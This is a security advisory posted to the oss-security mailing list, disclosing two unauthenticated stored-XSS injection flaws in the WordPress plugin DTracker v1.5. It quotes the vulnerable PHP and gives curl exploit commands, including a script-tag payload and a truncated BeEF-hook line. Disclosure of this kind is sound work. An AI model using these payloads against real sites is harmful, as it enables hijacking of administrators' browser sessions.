  oss-security - Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 13 Mar From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5  Title: Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5 Author: Larry W. Cashdollar, @_larry0 Date: Download Site: https://wordpress.org/plugins/dtracker/ Vendor: https://profiles.wordpress.org/dijo/ Vendor Notified: Vendor Contact: plugins@...dpress.org Advisory: Description: Track the details of the users downloading the pdf files from wordpress site.  Vulnerability: In file dtracker/save_contact.php  Doesn't check that the user is authorized before injecting new contacts into the wp_contact table.  A simple post request will allow any user to add new contacts.  A malicious user could inject javascript into the database to be executed in the browser of the admin user.    $name 		= $_POST['name']; 	$company	= $_POST['company']; 	$phone 		= $_POST['phone']; 	$country	= $_POST['country']; 	$contact_id = $_POST['contact_id']; 	 	$table 	= 'wp_contacts'; 	$data	= array( 				'name'		=> $name, 				'company'	=> $company, 				'phone'		=> $phone, 				'country'	=> $country, 			); 	$where	= array( 				'id'	=> $contact_id 			); 	 $wpdb->flush(); 	 $wpdb->update( $table, $data, $where ); //Update the Contact  In file dtracker/save_mail.php  Doesn't check that the user is authorized before injecting new emails into the wp_contact table.  A simple post request will allow any user to add new contacts.  A malicious user could inject javascript into the database to be executed in the browser of the admin user.     $email 	= $_POST['email']; 	$time	= date('Y-m-d H:i:s'); 	$ip		= $_SERVER [ 'REMOTE_ADDR' ] ; //get IP address of the visitor 	 	$table 	= "wp_contacts"; 	$data	= array ( 				'email' 	=> $email, 				'time'		=> $time, 				'ip'		=> $ip	 			); 	 	$wpdb->insert( $table, $data); //Insert Values 	$contact_id = $wpdb->insert_id; //Get ID of the last inserted row 	$data['contactId'] = $contact_id; 	echo json_encode($data); //Pass the id to the JS  Exploit Code: 	• $ curl --data "email=\"><script>alert(1);</script>" http://example.com/wordpress/wp-content/plugins/dtracker/save_mail.php 	• 	•   	• Or better yet, inject a BeEF hook. 	•   	• $ curl --data 'email="><script http://example.com/wordpress/wp-content/plugins/dtracker/save_mail.php Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      